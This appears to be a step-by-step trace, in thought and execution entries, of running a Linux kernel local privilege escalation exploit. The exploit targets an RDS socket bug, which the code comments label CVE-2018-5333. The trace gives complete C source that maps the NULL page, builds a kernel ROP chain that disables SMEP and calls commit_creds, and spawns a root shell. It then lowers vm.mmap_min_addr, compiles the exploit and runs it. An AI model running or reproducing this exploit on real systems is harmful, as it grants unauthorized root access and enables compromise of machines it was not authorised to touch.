[
    {
        "type": "thought",
        "content": "Setting Up Environment:\n\nIt starts by setting vm.mmap_min_addr to 0, allowing mmap to map at address 0.\nVarious headers and constants are defined to interact with the kernel and system calls.\nTriggering the Vulnerability (trigger_bug()):\n\nCreates a socket of type AF_RDS (Address Family for Reliable Datagram Sockets).\nBinds the socket to a local address.\nConstructs a message (msg) containing a control message (cmsg) of type RDS_CMSG_MASKED_ATOMIC_CSWP.\nUses SYS_sendmsg syscall to send this crafted message, triggering the vulnerability.\nMapping NULL (map_null() and mmap_to_zero()):\n\nAttempts to map memory at address 0, aiming to set up the environment for exploitation. However, it seems like mmap_to_zero() is used here to map memory at NULL instead of map_null().\nROP Chain Setup (main() function):\n\nConstructs a ROP (Return-Oriented Programming) chain on the mapped memory.\nDefines addresses of various functions and gadgets from the kernel space:\nnative_write_cr4: To modify the CR4 register.\nswapgs_restore_regs_and_return_to_usermode: To return to user mode.\ncommit_creds and prepare_kernel_cred: For privilege escalation.\nOther gadgets like pop_rdi, mov_cr4, etc., are used to construct the ROP chain.\nExecution:\n\nSets up a fake stack (fake_stack) on the mapped memory.\nConstructs a fake structure (data) at address 0.\nTriggers the vulnerability (trigger_bug()), which executes the ROP chain to escalate privileges.\nShell Execution:\n\nIf successful, gains root privilege and spawns a shell."
    },
    {
        "type": "execution",
        "content": "#define _GNU_SOURCE\n#include <fcntl.h>\n#include <signal.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdio.h>\n#include <stdint.h>\n#include <unistd.h>\n#include <linux/perf_event.h>\n#include <netinet/in.h>\n#include <sys/ioctl.h>\n#include <sys/klog.h>\n#include <sys/mman.h>\n#include <sys/socket.h>\n#include <sys/stat.h>\n#include <sys/syscall.h>\n#include <sys/types.h>\n#include <sys/utsname.h>\n\nunsigned long KERNEL_BASE = 0xffffffff81000000ul;\n#define RAND_SIZE 4096\n\n#ifndef SOL_RDS\n#  define SOL_RDS 276\n#endif\n#ifndef RDS_CMSG_MASKED_ATOMIC_CSWP\n#  define RDS_CMSG_MASKED_ATOMIC_CSWP 9\n#endif\n#ifndef AF_RDS\n#  define AF_RDS 0x15\n#endif\n\nvoid trigger_bug()\n{\n  struct sockaddr_in sin;\n  struct msghdr msg;\n  char buf[RAND_SIZE];\n  struct cmsghdr cmsg;\n\n  memset(&sin, 0, sizeof(struct sockaddr));\n  memset(&msg, 0, sizeof(msg));\n  memset(buf, 0x40, sizeof(buf));\n  memset(&cmsg, 0, sizeof(cmsg));\n\n  int fd = socket(AF_RDS, 5, 0);\n  if(fd < 0) {\n    printf(\"[-] socket(AF_RDS): %m\\n\");\n    return;\n  }\n\n  sin.sin_family = AF_INET;\n  sin.sin_port = htons(2000);\n  sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);\n\n  bind(fd, (struct sockaddr*)&sin, sizeof(sin));\n\n  cmsg.cmsg_len = RAND_SIZE;\n  cmsg.cmsg_type = RDS_CMSG_MASKED_ATOMIC_CSWP;\n  cmsg.cmsg_level = SOL_RDS;\n\n  memcpy(&buf[0], &cmsg, sizeof(cmsg));\n\n  *(uint64_t *)(buf + 0x18) = 0x40404000; /* args->local_addr */\n\n  msg.msg_name = &sin;\n  msg.msg_namelen = sizeof(sin);\n  msg.msg_iov = NULL;\n  msg.msg_iovlen = 0;\n  msg.msg_control = buf;\n  msg.msg_controllen = RAND_SIZE;\n  msg.msg_flags = MSG_DONTROUTE|MSG_PROXY|MSG_WAITALL;\n\n  syscall(SYS_sendmsg, fd, &msg, 0);\n}\n\n// https://bugs.chromium.org/p/project-zero/issues/detail?id=1792&desc=2\nvoid map_null() {\n  char *suid_path = \"/bin/su\";\n\n  void *map = mmap((void *)0x10000, 0x1000, PROT_READ | PROT_WRITE,\n    MAP_PRIVATE | MAP_ANONYMOUS | MAP_GROWSDOWN | MAP_FIXED, -1, 0);\n\n  if (map == MAP_FAILED) {\n    printf(\"[-] mmap(null): %m\\n\");\n    exit(EXIT_FAILURE);\n  }\n\n  char* path = \"/proc/self/mem\";\n  int fd = open(path, O_RDWR);\n\n  if (fd == -1) {\n    printf(\"open(%s): %m\\n\", path);\n    exit(EXIT_FAILURE);\n  }\n\n  unsigned long addr = (unsigned long)map;\n\n  while (addr != 0) {\n    addr -= 0x1000;\n    if (lseek(fd, addr, SEEK_SET) == -1) {\n      printf(\"lseek()\\n\");\n      exit(EXIT_FAILURE);\n    }\n    char cmd[1000];\n    sprintf(cmd, \"LD_DEBUG=help %s 1>&%d\", suid_path, fd);\n    system(cmd);\n  }\n}\n\nvoid mmap_to_zero()\n{\n  void* addr = mmap((void*)0, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);\n  if (addr < 0) {\n    perror(\"[!] Cannot mmap at null\");\n    exit(EXIT_FAILURE);\n  }\n  if (addr != (void*)0) {\n    printf(\"[!] Bad map at %p\\n\", addr);\n  }\n  else {\n    printf(\"[+] done, mapped null address\\n\");\n  }\n}\n\nsize_t user_cs, user_ss, user_rflags, user_sp;\nvoid save_status()\n{\n    __asm__(\"mov user_cs, cs;\"\n            \"mov user_ss, ss;\"\n            \"mov user_sp, rsp;\"\n            \"pushf;\"\n            \"pop user_rflags;\"\n            );\n    puts(\"[+]status has been saved.\");\n}\n\nstatic void shell() {\n  if (getuid() == 0 && geteuid() == 0) {\n    printf(\"[+] got root\\n\");\n    system(\"/bin/sh\");\n  } else {\n    printf(\"[-] failed\\n\");\n  }\n  exit(EXIT_FAILURE);\n}\n\nint main(int argc) {\n  save_status();\n// Step 1: mmap(0) \n  // map_null();    // change MMAP_MIN_ADDR   (exploit CVE-2019-9213, but failed)\n  mmap_to_zero();\n\n  unsigned long native_write_cr4 =    0xffffffff810603b0;   // ffffffff810603b0 t native_write_cr4\n  unsigned long swapgs_restore_regs_and_return_to_usermode =    0xffffffff81a00a7d;   // ffffffff81a00a7d T swapgs_restore_regs_and_return_to_usermode\n  unsigned long commit_creds =        0xffffffff8109f400;   // ffffffff8109f400 T commit_creds\n  unsigned long prepare_kernel_cred = 0xffffffff8109f7b0;   // ffffffff8109f7b0 T prepare_kernel_cred\n  unsigned long pop_rdi =             0xffffffff810028f1;   // 0xffffffff810028f1: pop rdi; ret;\n  unsigned long mov_cr4 =             0xffffffff8101e46c;   // 0xffffffff8101e46c: mov cr4, rdi; ret; \n  unsigned long xor_rdi =             0xffffffff810590cf;   // 0xffffffff810590cf: xor edi, edi; ret; \n  unsigned long mov_rdi_rax =         0xffffffff812805ac;   // 0xffffffff812805ac: mov rdi, rax; pop rbx; mov rax, rdi; pop rbp; pop r12; ret; \n  unsigned long xchg_esp =            0xffffffff8101ab98;   // 0xffffffff8101ab98: xchg eax, esp; add al, 0; ret;\n  unsigned long swapgs =              0xffffffff81060470;   // 0xffffffff81060470: swapgs; ret; \n  unsigned long iretq =               0xffffffff81032377;   // 0xffffffff81032377: iretq; ret; \n// Step 2: construct userspace ROP at (xchg & 0xffffffff)\n  printf(\"[+] mmapping fake stack...\\n\");\n  uint64_t page_size = getpagesize();\n  uint64_t stack_aligned = (xchg_esp & 0x00000000fffffffful) & ~(page_size - 1);\n  uint64_t stack_offset = xchg_esp % page_size;\n\n  unsigned long *fake_stack = mmap((void*)stack_aligned, 0x200000,\n    PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_GROWSDOWN | MAP_FIXED, -1, 0);\n  if (fake_stack == MAP_FAILED) {\n    printf(\"[-] mmap(fake_stack): %m\\n\");\n    exit(EXIT_FAILURE);\n  }\n\n  fake_stack = (unsigned long *)(stack_aligned + stack_offset);\n  int i = 0;\n  fake_stack[i++] = pop_rdi;\n  fake_stack[i++] = 0x6f0;\n  fake_stack[i++] = mov_cr4;\n  fake_stack[i++] = pop_rdi;\n  fake_stack[i++] = 0;\n  fake_stack[i++] = prepare_kernel_cred;\n  fake_stack[i++] = mov_rdi_rax;\n  fake_stack[i++] = 0x12345678;\n  fake_stack[i++] = 0x12345678;\n  fake_stack[i++] = 0x12345678;\n  fake_stack[i++] = commit_creds;\n\n  fake_stack[i++] = swapgs;\n  fake_stack[i++] = iretq;\n  //fake_stack[i++] = swapgs_restore_regs_and_return_to_usermode;\n  //fake_stack[i++] = 0;\n  //fake_stack[i++] = 0;\n  fake_stack[i++] = (unsigned long)shell;\n  fake_stack[i++] = user_cs;\n  fake_stack[i++] = user_rflags;\n  fake_stack[i++] = user_sp;\n  fake_stack[i++] = user_ss;\n\n// Step 3: construct fake struct at 0\n  static unsigned long result = 0;\n  unsigned long *data = (unsigned long *)0;\n  data[1] = (uint64_t)&result;\n  data[3] = xchg_esp;\n\n// Step 4: trigger CVE-2018-5333\n  printf(\"[+] executing payload %p...\\n\", (void*)&shell);\n  trigger_bug();\n\n  return 0;\n}"
    },
    {
        "type": "thought",
        "content": "Set the vm.mmap_min_addr value to 0."
    },
    {
        "type": "execution",
        "content": "sysctl -w vm.mmap_min_addr=0"
    },
    {
        "type": "thought",
        "content": "Save the content and compile it."
    },
    {
        "type": "execution",
        "content": "gcc -O3 -pthread -static -g -masm=intel ./exploit.c -o exploit"
    },
    {
        "type": "thought",
        "content": "Run the program."
    },
    {
        "type": "execution",
        "content": "./exploit"
    }
]